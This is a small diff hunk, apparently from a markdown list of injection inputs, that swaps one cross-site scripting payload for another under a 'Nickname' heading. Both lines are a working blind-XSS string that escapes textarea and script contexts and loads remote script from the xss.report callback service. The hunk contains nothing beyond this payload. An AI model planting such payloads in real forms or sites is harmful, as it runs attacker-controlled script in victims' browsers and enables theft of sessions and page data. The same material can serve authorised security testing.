@@ -8,7 +8,7 @@
 ```
 #### Nickname
 ```
-'";//></textarea></script><script/src=//xss.report/c/hnterx?60
+'";//></textarea></script><script/src=//xss.report/c/hnterx?nn
 ```
 #### Parameter input
 ```
